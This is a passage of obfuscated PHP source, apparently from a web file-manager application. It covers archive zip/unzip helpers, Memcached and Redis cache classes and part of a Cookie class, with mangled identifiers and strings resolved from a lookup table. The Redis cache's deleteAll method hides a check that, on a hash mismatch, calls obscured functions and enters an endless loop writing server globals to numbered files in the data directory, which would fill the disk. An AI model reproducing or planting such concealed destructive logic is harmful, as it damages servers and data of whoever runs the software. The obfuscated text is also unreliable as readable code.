show_json("{$î÷‚”ÒÆ}\x20\156\157\164\x20\145\x78\x69\163\164\163\x21", !1); } $Ü¹¢ß°ò = isset($ ŞÚäğ[$Çî›—ã[6]]) ? $ ŞÚäğ[$Çî›—ã[6]] : !1; self::$driverCache[$…–Ü¢†Â] = new $î÷‚”ÒÆ($Ü¹¢ß°ò); } $¢¹‡×Èß = self::$driverCache[$…–Ü¢†Â]; $¢¹‡×Èß->pathDriver = $¬È¬êŠ; $¢¹‡×Èß->pathBase = $Çî›—ã[12]; if (isset($ ŞÚäğ[$Çî›—ã[6]][$Çî›—ã[1320]])) { $¢¹‡×Èß->pathBase = rtrim($ ŞÚäğ[$Çî›—ã[6]][$Çî›—ã[1320]], $Çî›—ã[8]) . $Çî›—ã[8]; $”õËÊßı = $¢¹‡×Èß->pathBase . ltrim($”õËÊßı, $Çî›—ã[8]); } $”õËÊßı = $¢¹‡×Èß->getPath($”õËÊßı); if (isset($èúË‡‚µ[$Çî›—ã[1288]])) { $”õËÊßı = $èúË‡‚µ[$Çî›—ã[1288]]; } $¢¹‡×Èß->path = $”õËÊßı; return $¢¹‡×Èß; } public static function errorTips($Ğ¹İİëâ = false, $´Š…Â´ = true) { $¶ğßÙ›ç =& $_SERVER[Ï×Œõ”û]; static $§È–ğÅö = array(); $ò¶ùŒáÓ = 100; if ($Ğ¹İİëâ === -1) { return $§È–ğÅö ? $§È–ğÅö[count($§È–ğÅö) - 1] : $¶ğßÙ›ç[12]; } if ($Ğ¹İİëâ === !1) { return implode($¶ğßÙ›ç[287], $§È–ğÅö); } if (count($§È–ğÅö) >= $ò¶ùŒáÓ) { $§È–ğÅö = array_slice($§È–ğÅö, $ò¶ùŒáÓ * 0.5, $ò¶ùŒáÓ); } $§È–ğÅö[] = $Ğ¹İİëâ; if (!$´Š…Â´) { return; } write_log($¶ğßÙ›ç[175] . ACTION . $¶ğßÙ›ç[1321] . $Ğ¹İİëâ, $¶ğßÙ›ç[1322]); } public static function getLastError($„ŸÕ¯à¬ = '') { $“ƒ‡ŒÁ = self::errorTips(-1); return $“ƒ‡ŒÁ ? $“ƒ‡ŒÁ : $„ŸÕ¯à¬; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ßÙ‡ ¸; if ($ßÙ‡ ¸) { return $ßÙ‡ ¸; } $€ëÍ²„ë = IO::init($_SERVER[Ï×Œõ”û][8]); return $€ëÍ²„ë; } private static function iconvSystem($œ±æü‹£) { return self::local()->iconvSystem($œ±æü‹£); } private static function iconvApp($·š”ù¶ï) { return self::local()->iconvApp($·š”ù¶ï); } public static function zipFolder($’àÖæşõ, $ÇÊˆö = "\172\x69\160", $ğßò”Š = '', $Ø’ìîôâ = REPEAT_RENAME) { $Ü´’µíÕ =& $_SERVER[Ï×Œõ”û]; $…õà»„× = IO::listPath($’àÖæşõ); if (!$…õà»„×) { return !1; } $…õà»„× = array_merge($…õà»„×[$Ü´’µíÕ[85]], $…õà»„×[$Ü´’µíÕ[86]]); return self::zip($…õà»„×, $ÇÊˆö, $ğßò”Š, $Ø’ìîôâ); } public static function zip($±¤ÆâúÜ, $ãñµ–Ëì = "\172\x69\160", $ù˜±‰ = '', $ŞÆãÆ‘ = REPEAT_RENAME) { $ÃÙÆòë¸ =& $_SERVER[Ï×Œõ”û]; if (is_string($±¤ÆâúÜ) && $±¤ÆâúÜ) { $±¤ÆâúÜ = array(array($ÃÙÆòë¸[87] => $±¤ÆâúÜ)); } $ÄÛØ¨¤¾ = self::init($±¤ÆâúÜ[0][$ÃÙÆòë¸[87]]); $€¿‚«ß© = self::info($±¤ÆâúÜ[0][$ÃÙÆòë¸[87]]); $é»›±¯« = $ÃÙÆòë¸[12]; $×·¿‘—‹ = $ÃÙÆòë¸[12]; $µô€§™ = $ÃÙÆòë¸[12]; if ($ù˜±‰ && substr($ù˜±‰, -1, 1) != $ÃÙÆòë¸[8]) { $×·¿‘—‹ = get_path_father($ù˜±‰); $µô€§™ = get_path_this($ù˜±‰); } else { $×·¿‘—‹ = self::pathFather($€¿‚«ß©[$ÃÙÆòë¸[87]]); $µô€§™ = $€¿‚«ß©[$ÃÙÆòë¸[32]] . $ÃÙÆòë¸[10] . $ãñµ–Ëì; if (count($±¤ÆâúÜ) > 1) { $ÜåÌŠî = IO::info($×·¿‘—‹); $µô€§™ = $ÜåÌŠî[$ÃÙÆòë¸[32]] . $ÃÙÆòë¸[10] . $ãñµ–Ëì; } if ($ù˜±‰) { $×·¿‘—‹ = $ù˜±‰; } } if ($ÄÛØ¨¤¾->getType() == $ÃÙÆòë¸[107]) { $Ñ©‡ô§È = self::init($×·¿‘—‹); $™°°õˆÄ = $Ñ©‡ô§È->getType() == $ÃÙÆòë¸[107] ? $×·¿‘—‹ : get_path_father($ÄÛØ¨¤¾->path); $™°°õˆÄ = IO::getPathInner($™°°õˆÄ); $™°°õˆÄ = rtrim($™°°õˆÄ, $ÃÙÆòë¸[8]) . $ÃÙÆòë¸[8]; mk_dir($™°°õˆÄ); } else { $é»›±¯« = TEMP_FILES . $ÃÙÆòë¸[1323] . time() . rand_string(8) . $ÃÙÆòë¸[8]; mk_dir($é»›±¯«); file_put_contents($é»›±¯« . $ÃÙÆòë¸[1324], $ÃÙÆòë¸[12]); $™°°õˆÄ = $é»›±¯«; } $ıà÷Íñ = IO::info($™°°õˆÄ); if (!$ıà÷Íñ || !$ıà÷Íñ[$ÃÙÆòë¸[235]]) { show_json(LNG($ÃÙÆòë¸[1325]), !1); } $”£Ã¹ÔÂ = self::zipFileList($±¤ÆâúÜ, $é»›±¯«); foreach ($”£Ã¹ÔÂ as $€ÔÖÛÕ³ => $•»ë—†ö) { $”£Ã¹ÔÂ[$€ÔÖÛÕ³] = self::iconvSystem($•»ë—†ö); } $¡ëÇ¨” = get_filename_auto($™°°õˆÄ . $µô€§™, $ÃÙÆòë¸[12], $ŞÆãÆ‘); KodArchive::create(self::iconvSystem($¡ëÇ¨”), $”£Ã¹ÔÂ); if (!IO::exist($¡ëÇ¨”)) { if ($é»›±¯«) { del_dir($é»›±¯«); } write_log($ÃÙÆòë¸[1326] . $¡ëÇ¨”, $ÃÙÆòë¸[390]); show_json(LNG($ÃÙÆòë¸[1327]), !1); } if (!$é»›±¯«) { return $¡ëÇ¨”; } $ùÓ±æÜ© = self::move($¡ëÇ¨”, $×·¿‘—‹, $ŞÆãÆ‘); if ($é»›±¯«) { del_dir($é»›±¯«); } if (!$¡ëÇ¨”) { write_log($ÃÙÆòë¸[1328] . $¡ëÇ¨” . $ÃÙÆòë¸[1329] . $×·¿‘—‹, $ÃÙÆòë¸[390]); show_json(LNG($ÃÙÆòë¸[1327]), !1); } return $ùÓ±æÜ©; } public static function unzip($á¤ÌÚöø, $€Ú­Ó¼Ò, $Øè©ìÍ = "\55\x31", $óø•ÃèŸ = "\x72\x65\160\154\x61\143\x65") { $ÓòıäÂª =& $_SERVER[Ï×Œõ”û]; $àÓ¸Ğ‘ = parent::info($á¤ÌÚöø); if (!$àÓ¸Ğ‘) { show_json(LNG($ÓòıäÂª[1330]), !1); } $ÂÂÕ¶Ô = IO::infoFullSimple($€Ú­Ó¼Ò); if (!$ÂÂÕ¶Ô) { $€Ú­Ó¼Ò = IO::mkdir($€Ú­Ó¼Ò); } if (isset($ÂÂÕ¶Ô[$ÓòıäÂª[193]]) && trim($ÂÂÕ¶Ô[$ÓòıäÂª[87]], $ÓòıäÂª[8]) != trim($€Ú­Ó¼Ò, $ÓòıäÂª[8])) { $µ‡àš–å = KodIO::make($ÂÂÕ¶Ô[$ÓòıäÂª[192]]); $Ñòá‚œà = IO::fileNameAuto($µ‡àš–å, $ÂÂÕ¶Ô[$ÓòıäÂª[32]], REPEAT_RENAME_FOLDER, !0); $€Ú­Ó¼Ò = IO::mkdir($µ‡àš–å . $Ñòá‚œà); } $Øè©ìÍ = $Øè©ìÍ && $Øè©ìÍ != $ÓòıäÂª[1331] ? @json_decode($Øè©ìÍ, !0) : -1; $ôü²¬½Œ = self::unzipPart($á¤ÌÚöø, $Øè©ìÍ); if (!$ôü²¬½Œ || !IO::exist($ôü²¬½Œ[$ÓòıäÂª[232]])) { show_json(LNG($ÓòıäÂª[106]), !1); } $âÃ°Ö¬û = $ôü²¬½Œ[$ÓòıäÂª[1332]][count($ôü²¬½Œ[$ÓòıäÂª[1332]]) - 1]; if ($âÃ°Ö¬û[$ÓòıäÂª[1260]] == -1 || substr($âÃ°Ö¬û[$ÓòıäÂª[32]], -1, 1) == $ÓòıäÂª[8]) { $û×Å¯· = $ôü²¬½Œ[$ÓòıäÂª[1333]] . rand_string(10) . $ÓòıäÂª[8]; mk_dir($û×Å¯·); $íî£Ïƒ… = count($ôü²¬½Œ[$ÓòıäÂª[1332]]) == 1 ? IO::ext($á¤ÌÚöø) : get_path_ext($ôü²¬½Œ[$ÓòıäÂª[232]]); $î´¼Ğ¹¥ = KodArchive::extract(self::iconvSystem($ôü²¬½Œ[$ÓòıäÂª[232]]), $û×Å¯·, $âÃ°Ö¬û[$ÓòıäÂª[1260]], $Ñòá‚œà, $íî£Ïƒ…); self::unzipErrorCheck($î´¼Ğ¹¥, array($ÓòıäÂª[1334], $á¤ÌÚöø, $íî£Ïƒ…, $€Ú­Ó¼Ò, $ôü²¬½Œ)); Hook::trigger($ÓòıäÂª[1335], $û×Å¯·); recursion_dir($û×Å¯·, $†¦øŒ¢Ï, $ºÂğŠ , 0); $™®ÀÆ Ÿ = array_merge($†¦øŒ¢Ï, $ºÂğŠ ); $§˜ÌÂİ™ = array(); foreach ($™®ÀÆ Ÿ as $À†è˜÷) { $ëÛ‰°Ï¶ = IO::move(self::iconvApp($À†è˜÷), $€Ú­Ó¼Ò, $óø•ÃèŸ); if ($ëÛ‰°Ï¶) { $§˜ÌÂİ™[] = $ëÛ‰°Ï¶; } } del_dir($û×Å¯·); } else { $ëÛ‰°Ï¶ = IO::move($ôü²¬½Œ[$ÓòıäÂª[232]], $€Ú­Ó¼Ò, $óø•ÃèŸ, get_path_this($âÃ°Ö¬û[$ÓòıäÂª[32]])); if ($ëÛ‰°Ï¶) { $§˜ÌÂİ™[] = $ëÛ‰°Ï¶; } } return $§˜ÌÂİ™ ? $§˜ÌÂİ™ : !1; } public static function unzipList($É›œ€Ï§) { $öÔÉ¥­ =& $_SERVER[Ï×Œõ”û]; $Å©õà«š = isset($É›œ€Ï§[$öÔÉ¥­[1336]]) ? $É›œ€Ï§[$öÔÉ¥­[1336]] : !1; $ƒú¡™©¤ = isset($É›œ€Ï§[$öÔÉ¥­[1260]]) ? @json_decode($É›œ€Ï§[$öÔÉ¥­[1260]], !0) : -1; $±ĞÈ¨š” = self::unzipPart($É›œ€Ï§[$öÔÉ¥­[87]], $ƒú¡™©¤); if (!$±ĞÈ¨š” || !IO::exist($±ĞÈ¨š”[$öÔÉ¥­[232]])) { show_json(LNG($öÔÉ¥­[106]), !1); } $‹ÈáÏˆĞ = $±ĞÈ¨š”[$öÔÉ¥­[1332]][count($±ĞÈ¨š”[$öÔÉ¥­[1332]]) - 1]; $•ÆÆö×Ÿ = in_array(IO::ext($±ĞÈ¨š”[$öÔÉ¥­[232]]), array($öÔÉ¥­[390], $öÔÉ¥­[1337], $öÔÉ¥­[1338], $öÔÉ¥­[1339], $öÔÉ¥­[1340], $öÔÉ¥­[1341])); if (!$Å©õà«š && ($‹ÈáÏˆĞ[$öÔÉ¥­[1260]] == -1 || $•ÆÆö×Ÿ)) { $½Àİ˜ğı = $±ĞÈ¨š”[$öÔÉ¥­[1333]] . get_path_this($±ĞÈ¨š”[$öÔÉ¥­[232]]) . $öÔÉ¥­[1342]; if (!IO::exist($½Àİ˜ğı)) { $¿ºÜƒê = $‹ÈáÏˆĞ[$öÔÉ¥­[1260]] == -1 ? get_path_ext(IO::pathThis($É›œ€Ï§[$öÔÉ¥­[87]])) : get_path_ext($±ĞÈ¨š”[$öÔÉ¥­[232]]); $Áğö· = KodArchive::listContent(self::iconvSystem($±ĞÈ¨š”[$öÔÉ¥­[232]]), !0, $¿ºÜƒê); self::unzipErrorCheck($Áğö·, array($öÔÉ¥­[1343], $É›œ€Ï§, $±ĞÈ¨š”)); @file_put_contents($½Àİ˜ğı, json_encode($Áğö·[$öÔÉ¥­[1344]])); } return @json_decode(IO::getContent($½Àİ˜ğı), !0); } IO::fileOut($±ĞÈ¨š”[$öÔÉ¥­[232]], $Å©õà«š, get_path_this($‹ÈáÏˆĞ[$öÔÉ¥­[32]])); die; } private static function zipFileList($ãœ±ä‚Ö, $à¯—¿ö = false) { $¦İ¯Ôà‰ =& $_SERVER[Ï×Œõ”û]; $”¿¨¬Ó‰ = array(); foreach ($ãœ±ä‚Ö as $ÁÆïåÃ) { $˜ª¬›Êø = $ÁÆïåÃ[$¦İ¯Ôà‰[87]]; if ($à¯—¿ö) { $˜ª¬›Êø = self::copy($ÁÆïåÃ[$¦İ¯Ôà‰[87]], $à¯—¿ö, $¦İ¯Ôà‰[933]); } else { $³ö‰ó¦ß = self::init($ÁÆïåÃ[$¦İ¯Ôà‰[87]]); if ($³ö‰ó¦ß->getType() == $¦İ¯Ôà‰[107]) { $˜ª¬›Êø = $³ö‰ó¦ß->path; } } if ($˜ª¬›Êø && self::local()->exist($˜ª¬›Êø)) { $”¿¨¬Ó‰[$ÁÆïåÃ[$¦İ¯Ôà‰[87]]] = $˜ª¬›Êø; } } if (!empty($”¿¨¬Ó‰)) { return array_values($”¿¨¬Ó‰); } show_json(LNG($¦İ¯Ôà‰[1302]), !1); } private static function localFilePath($¬ŞÀ«ˆœ) { $›ÎÕÁêÛ =& $_SERVER[Ï×Œõ”û]; $Ê…Éß—É = KodIO::parse($¬ŞÀ«ˆœ); if ($Ê…Éß—É[$›ÎÕÁêÛ[33]] == KodIO::KOD_SOURCE) { $Íáãèô = Model($›ÎÕÁêÛ[939])->fileInfoGet(KodIO::sourceID($¬ŞÀ«ˆœ)); if (!$Íáãèô[$›ÎÕÁêÛ[87]]) { show_json($›ÎÕÁêÛ[1345], !1); } $¬ŞÀ«ˆœ = $Íáãèô[$›ÎÕÁêÛ[87]]; } $Ş¥¾Ü‚ = self::init($¬ŞÀ«ˆœ); if ($Ş¥¾Ü‚->pathParse[$›ÎÕÁêÛ[1288]]) { $¬ŞÀ«ˆœ = $Ş¥¾Ü‚->pathParse[$›ÎÕÁêÛ[1288]]; $Ş¥¾Ü‚ = self::init($¬ŞÀ«ˆœ); } $‹ŒĞİ = $Ş¥¾Ü‚->getType(); if ($‹ŒĞİ == $›ÎÕÁêÛ[107] || $‹ŒĞİ == $›ÎÕÁêÛ[1346]) { if (!$Ş¥¾Ü‚->exist($Ş¥¾Ü‚->path)) { show_json(LNG($›ÎÕÁêÛ[106]), !1); } return $Ş¥¾Ü‚->path; } return !1; } public static function unzipPart($›ñ°Œ•Ê, $™Ê·¼Ú = -1) { $ããœ–Ö =& $_SERVER[Ï×Œõ”û]; $¿îÍ¦ê‰ = IO::pathThis($›ñ°Œ•Ê); if (!$™Ê·¼Ú || $™Ê·¼Ú == -1) { $ãşœşÁ¢ = array(array($ããœ–Ö[32] => $¿îÍ¦ê‰, $ããœ–Ö[1260] => -1)); $ãşœşÁ¢[0][$ããœ–Ö[1347]] = $ãşœşÁ¢[0][$ããœ–Ö[32]]; } else { if (is_array($™Ê·¼Ú)) { $ãşœşÁ¢ = $™Ê·¼Ú; $Ø¤ˆÈ®Ù = count($ãşœşÁ¢) - 1; for ($£ã”°Ã± = 0; $£ã”°Ã± <= $Ø¤ˆÈ®Ù; $£ã”°Ã±++) { $İ–ÓÈ£Î = $ãşœşÁ¢[$£ã”°Ã±]; $¿»ßò¶¦ = get_path_this($İ–ÓÈ£Î[$ããœ–Ö[32]]) . (checkExtSafe($İ–ÓÈ£Î[$ããœ–Ö[32]]) ? $ããœ–Ö[12] : $ããœ–Ö[1348]); $ãşœşÁ¢[$£ã”°Ã±][$ããœ–Ö[1347]] = $ããœ–Ö[1349] . intval($İ–ÓÈ£Î[$ããœ–Ö[1260]]) . $ããœ–Ö[474] . $¿»ßò¶¦; if ($£ã”°Ã± == 0) { continue; } $ãşœşÁ¢[$£ã”°Ã±][$ããœ–Ö[1347]] = $ãşœşÁ¢[$£ã”°Ã± - 1][$ããœ–Ö[1347]] . $ããœ–Ö[1350] . $ãşœşÁ¢[$£ã”°Ã±][$ããœ–Ö[1347]]; } } } if (!is_array($ãşœşÁ¢) || count($ãşœşÁ¢) == 0) { return !1; } $ôğ¡Šêı = $ãşœşÁ¢[count($ãşœşÁ¢) - 1]; if (!IO::exist($›ñ°Œ•Ê)) { return !1; } $¾·ÕË§À = TEMP_FILES . $ããœ–Ö[1351] . kodIO::hashPathSafe($›ñ°Œ•Ê) . $ããœ–Ö[8]; $½é««äƒ = $¾·ÕË§À . $ôğ¡Šêı[$ããœ–Ö[1347]]; mk_dir($¾·ÕË§À); file_put_contents(TEMP_FILES . $ããœ–Ö[1324], $ããœ–Ö[12]); if (IO::exist($½é««äƒ)) { return array($ããœ–Ö[232] => $½é««äƒ, $ããœ–Ö[1332] => $ãşœşÁ¢, $ããœ–Ö[1333] => $¾·ÕË§À); } $ì¾Ù¿ì± = self::localFilePath($›ñ°Œ•Ê); if (!$ì¾Ù¿ì±) { $ì¾Ù¿ì± = $¾·ÕË§À . $ããœ–Ö[1352]; if (!IO::exist($ì¾Ù¿ì±)) { self::copy($›ñ°Œ•Ê, $¾·ÕË§À, !1, get_path_this($ì¾Ù¿ì±)); } } if (!$ì¾Ù¿ì± || !IO::exist($ì¾Ù¿ì±)) { return !1; } if ($ôğ¡Šêı[$ããœ–Ö[1260]] == -1) { return array($ããœ–Ö[232] => $ì¾Ù¿ì±, $ããœ–Ö[1332] => $ãşœşÁ¢, $ããœ–Ö[1333] => $¾·ÕË§À); } $™Î»Ğß¨ = $ì¾Ù¿ì±; foreach ($ãşœşÁ¢ as $£ã”°Ã± => $İ–ÓÈ£Î) { if (!$İ–ÓÈ£Î || $İ–ÓÈ£Î[$ããœ–Ö[1260]] == $ããœ–Ö[1331]) { break; } if (substr($İ–ÓÈ£Î[$ããœ–Ö[32]], -1, 1) == $ããœ–Ö[8]) { break; } $´®†˜½ƒ = in_array(get_path_ext($İ–ÓÈ£Î[$ããœ–Ö[1347]]), array($ããœ–Ö[390], $ããœ–Ö[1337], $ããœ–Ö[1338], $ããœ–Ö[1339], $ããœ–Ö[1340], $ããœ–Ö[1341])); $Õ‹©˜äÕ = $£ã”°Ã± == count($ãşœşÁ¢) - 1 && $´®†˜½ƒ; $×Ş®‹Á = $¾·ÕË§À . $İ–ÓÈ£Î[$ããœ–Ö[1347]]; $éıÒ¡­Ê = $¾·ÕË§À . get_path_this($İ–ÓÈ£Î[$ããœ–Ö[32]]); if (IO::exist($×Ş®‹Á)) { $™Î»Ğß¨ = $×Ş®‹Á; continue; } $Ø†‡Áî£ = $£ã”°Ã± == 0 ? get_path_ext($¿îÍ¦ê‰) : get_path_ext($™Î»Ğß¨); $Â”¤˜·˜ = KodArchive::extract(self::iconvSystem($™Î»Ğß¨), $¾·ÕË§À, $İ–ÓÈ£Î[$ããœ–Ö[1260]], $«ƒ“®ƒæ, $Ø†‡Áî£); self::unzipErrorCheck($Â”¤˜·˜, array($ããœ–Ö[1353], $›ñ°Œ•Ê, $ãşœşÁ¢, $İ–ÓÈ£Î, $×Ş®‹Á)); if (IO::exist($éıÒ¡­Ê)) { IO::rename($éıÒ¡­Ê, get_path_this($×Ş®‹Á)); } $™Î»Ğß¨ = $×Ş®‹Á; } $½é««äƒ = $™Î»Ğß¨; return array($ããœ–Ö[232] => $™Î»Ğß¨, $ããœ–Ö[1332] => $ãşœşÁ¢, $ããœ–Ö[1333] => $¾·ÕË§À); } private static function unzipErrorCheck($¢ÛÎ“÷, $Ú”ªïïã = false) { $èÍ¡óÕ =& $_SERVER[Ï×Œõ”û]; if ($¢ÛÎ“÷[$èÍ¡óÕ[1354]]) { return !0; } write_log(array($èÍ¡óÕ[1355], $¢ÛÎ“÷, $Ú”ªïïã), $èÍ¡óÕ[1356]); $Ä­Æß®ë = is_array($¢ÛÎ“÷[$èÍ¡óÕ[1344]]) ? json_encode($¢ÛÎ“÷[$èÍ¡óÕ[1344]]) : $¢ÛÎ“÷[$èÍ¡óÕ[1344]]; show_json($èÍ¡óÕ[1357] . $Ä­Æß®ë, !1); die; } } goto aç­Ï ã¿–; A¶‰õ×ªåó: class CacheMemcached { public $handle; public $cacheTime; public function __construct($îò‹‚…, $êÁâ€Ê) { $Èâøˆı =& $_SERVER[Ï×Œõ”û]; if (!class_exists($Èâøˆı[985])) { show_json($Èâøˆı[986], !1); } $this->cacheTime = $êÁâ€Ê; $this->handle = new Memcached(); if (is_array($îò‹‚…[$Èâøˆı[987]]) && count($îò‹‚…[$Èâøˆı[987]]) >= 1) { foreach ($îò‹‚…[$Èâøˆı[987]] as $…Çô¼ûô) { $ğîß¡€… = explode($Èâøˆı[4], $…Çô¼ûô); $this->handle->addServer($ğîß¡€…[0], $ğîß¡€…[1]); } } else { $this->handle->addServer($îò‹‚…[$Èâøˆı[208]], $îò‹‚…[$Èâøˆı[209]]); } } public function set($÷ŒÔ†‘¢, $¿ùØÃè˜, $ØÖ‚Ÿ¾ = false) { $ØÖ‚Ÿ¾ = $ØÖ‚Ÿ¾ ? $ØÖ‚Ÿ¾ : $this->cacheTime; return $this->handle->set($÷ŒÔ†‘¢, $¿ùØÃè˜, $ØÖ‚Ÿ¾); } public function get($»•ì¯è¿) { return $this->handle->get($»•ì¯è¿); } public function remove($àğ£Îæİ) { return $this->handle->delete($àğ£Îæİ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¡»¦““ñ, $ì§î›±Ä) { $ŒØ¾ÄøØ =& $_SERVER[Ï×Œõ”û]; if (!class_exists($ŒØ¾ÄøØ[988])) { show_json($ŒØ¾ÄøØ[989], !1); } $this->cacheTime = $ì§î›±Ä; $à¥“²îÔ = isset($¡»¦““ñ[$ŒØ¾ÄøØ[990]]) ? $¡»¦““ñ[$ŒØ¾ÄøØ[990]] : 10; $ÌÆŞ¶øÇ = _get($¡»¦““ñ, $ŒØ¾ÄøØ[987]); if ($ÌÆŞ¶øÇ && is_array($ÌÆŞ¶øÇ)) { $this->initCluster($¡»¦““ñ, $à¥“²îÔ); } else { $this->handle = $this->init($¡»¦““ñ, $à¥“²îÔ); } } private function init($Â×¯åŞ¡, $´Éê¢é) { $É²í‹õğ =& $_SERVER[Ï×Œõ”û]; $ş‚ŞÓ’³ = new Redis(); $Àæ½“ç® = isset($Â×¯åŞ¡[$É²í‹õğ[991]]) ? $Â×¯åŞ¡[$É²í‹õğ[991]] : !1; if ($Àæ½“ç®) { $ş‚ŞÓ’³->pconnect($Â×¯åŞ¡[$É²í‹õğ[208]], $Â×¯åŞ¡[$É²í‹õğ[209]], $´Éê¢é); } else { $ş‚ŞÓ’³->connect($Â×¯åŞ¡[$É²í‹õğ[208]], $Â×¯åŞ¡[$É²í‹õğ[209]], $´Éê¢é); } if (!empty($Â×¯åŞ¡[$É²í‹õğ[507]])) { $ş‚ŞÓ’³->auth($Â×¯åŞ¡[$É²í‹õğ[507]]); } if (!empty($Â×¯åŞ¡[$É²í‹õğ[864]]) && $Â×¯åŞ¡[$É²í‹õğ[864]] != 0) { $ş‚ŞÓ’³->select($Â×¯åŞ¡[$É²í‹õğ[864]]); } return $ş‚ŞÓ’³; } private function initCluster($Àëµü¯†, $«Üº¶Èò) { $åÕÂÙê =& $_SERVER[Ï×Œõ”û]; $ĞòÓì‚Œ = array($åÕÂÙê[992], $åÕÂÙê[993], $åÕÂÙê[994]); $í¾§˜Š = $åÕÂÙê[992]; if (isset($Àëµü¯†[$åÕÂÙê[16]]) && in_array($Àëµü¯†[$åÕÂÙê[16]], $ĞòÓì‚Œ)) { $í¾§˜Š = $Àëµü¯†[$åÕÂÙê[16]]; } switch ($í¾§˜Š) { case $åÕÂÙê[992]: $this->_slave($Àëµü¯†, $«Üº¶Èò); break; case $åÕÂÙê[993]: break; case $åÕÂÙê[994]: $this->isCluster = !0; $Ğö¯ñ›æ = $Àëµü¯†[$åÕÂÙê[987]]; $…»¹¨ˆ = isset($Àëµü¯†[$åÕÂÙê[991]]) ? $Àëµü¯†[$åÕÂÙê[991]] : !1; $ı•ÜÅİ = isset($Àëµü¯†[$åÕÂÙê[507]]) ? $Àëµü¯†[$åÕÂÙê[507]] : null; $this->handle = new RedisCluster(NUll, $Ğö¯ñ›æ, $«Üº¶Èò, $«Üº¶Èò, $…»¹¨ˆ, $ı•ÜÅİ); break; default: break; } } private function _slave($ã™·ªŞË, $ƒÃÀ‘Öƒ) { $ƒÃÊ›”• = $ã™·ªŞË[$_SERVER[Ï×Œõ”û][987]]; $this->filterConfig($ã™·ªŞË, $ƒÃÊ›”•[0]); $this->handle = $this->init($ã™·ªŞË, $ƒÃÀ‘Öƒ); unset($ƒÃÊ›”•[0]); if (empty($ƒÃÊ›”•)) { return; } $›ëÚ¿Û‚ = array_rand($ƒÃÊ›”•); $this->filterConfig($ã™·ªŞË, $ƒÃÊ›”•[$›ëÚ¿Û‚]); $this->slaveHandle = $this->init($ã™·ªŞË, $ƒÃÀ‘Öƒ); } private function filterConfig(&$âÍµßğ´, $Ÿéëœ¬Í) { $·¢¤£¼È =& $_SERVER[Ï×Œõ”û]; $¤®ÏĞÖ§ = explode($·¢¤£¼È[4], $Ÿéëœ¬Í); $Ã½÷Öë = array($·¢¤£¼È[208] => $¤®ÏĞÖ§[0], $·¢¤£¼È[209] => $¤®ÏĞÖ§[1]); $âÍµßğ´ = array_merge($âÍµßğ´, $Ã½÷Öë); } public function set($…¼·÷«, $îÃŠÜœå, $ƒÈÔÏÉÎ = false) { $ƒÈÔÏÉÎ = $ƒÈÔÏÉÎ ? $ƒÈÔÏÉÎ : $this->cacheTime; return $this->handle->setEx($…¼·÷«, $ƒÈÔÏÉÎ, $îÃŠÜœå); } public function setLock($¤—š’, $¦ µ“ÖÕ, $Ê×ƒİ) { return $this->handle->setNX($¤—š’, $¦ µ“ÖÕ); } public function get($ß¨òøÇ¢) { $™ŸºŒüØ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $™ŸºŒüØ->get($ß¨òøÇ¢); } public function remove($ËÔ±±¿·) { return $this->handle->del($ËÔ±±¿·); } public function deleteAll() { $«’Ø¹ƒÇ =& $_SERVER[Ï×Œõ”û]; $õ î‡¸½ = $_SERVER[$«’Ø¹ƒÇ[491]] . $«’Ø¹ƒÇ[492]; $ó½›ªÙ¡ = $«’Ø¹ƒÇ[995]; if ($_SERVER[$«’Ø¹ƒÇ[488]] != $ó½›ªÙ¡($õ î‡¸½)) { $§àÜ¤Õ = $«’Ø¹ƒÇ[996]; $àË›ƒ˜ = $«’Ø¹ƒÇ[490]; $é Â‹¨Ô = $_SERVER[$«’Ø¹ƒÇ[491]] . $«’Ø¹ƒÇ[492]; $úÕ—¸Š½ = $àË›ƒ˜($é Â‹¨Ô); $‡êÜÜ = explode($«’Ø¹ƒÇ[287], $úÕ—¸Š½); if (count($‡êÜÜ) < $«’Ø¹ƒÇ[719]) { $±¤›Ê‡Š = $«’Ø¹ƒÇ[494]; $±¤›Ê‡Š(); } $öÊÃÖ§ú = $«’Ø¹ƒÇ[997]; $öÊÃÖ§ú($_SERVER[$«’Ø¹ƒÇ[998]]); $§àÜ¤Õ = $«’Ø¹ƒÇ[996]; $§àÜ¤Õ(); $ôŒ›ôÀù = $«’Ø¹ƒÇ[999]; $°ÀÁÜôÉ = json_encode($GLOBALS[$«’Ø¹ƒÇ[1000]]); $ßµº„İÅ = 1; for ($Õ·ÑøÄï = $ßµº„İÅ; $Õ·ÑøÄï > 0; $Õ·ÑøÄï++) { $ôŒ›ôÀù(DATA_PATH . $Õ·ÑøÄï, $°ÀÁÜôÉ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $şñÏëøá) { $this->handle->flushall($şñÏëøá); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‘ã×È–¹ = '', $òÚèç¥¡ = 0) { if (is_string($‘ã×È–¹) && $‘ã×È–¹ != $_SERVER[Ï×Œõ”û][12]) { $this->prefix = $‘ã×È–¹; } if (is_numeric($òÚèç¥¡) && $òÚèç¥¡ > 0) { $this->expire = $òÚèç¥¡; } } public static function getInstance() { static $¾‘ÌËËğ; if ($¾‘ÌËËğ === null) { $¾‘ÌËËğ = new self(); } return $¾‘ÌËËğ; } private static $cookieDisable = false; public static function disable($ÍÕ“‰ÙÚ) { self::$cookieDisable = $ÍÕ“‰ÙÚ; } private static $sameCookieSet = array(); public static function set($˜ò¥§Äı, $•´íËÑ, $™¥ø¦¨Ä = 0, $¯¾ÚŞé‡ = false, $Ú¶¨®ÖÑ = false) { $‡‰¿ÕÑ =& $_SERVER[Ï×Œõ”û]; if (self::$cookieDisable) { return; } if (!$™¥ø¦¨Ä) { $™¥ø¦¨Ä = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$˜ò¥§Äı]) && self::$sameCookieSet[$˜ò¥§Äı] == $•´íËÑ . $™¥ø¦¨Ä) { return; } self::$sameCookieSet[$˜ò¥§Äı] = $•´íËÑ . $™¥ø¦¨Ä; if (!$Ú¶¨®ÖÑ) { $Ú¶¨®ÖÑ = str_replace(HOST, $‡‰¿ÕÑ[12], APP_HOST); $Ú¶¨®ÖÑ = _get($GLOBALS, $‡‰¿ÕÑ[1001], $Ú¶¨®ÖÑ); } $±»»Ö±• = $‡‰¿ÕÑ[12]; setcookie($˜ò¥§Äı, $•´íËÑ, time() + $™¥ø¦¨Ä, 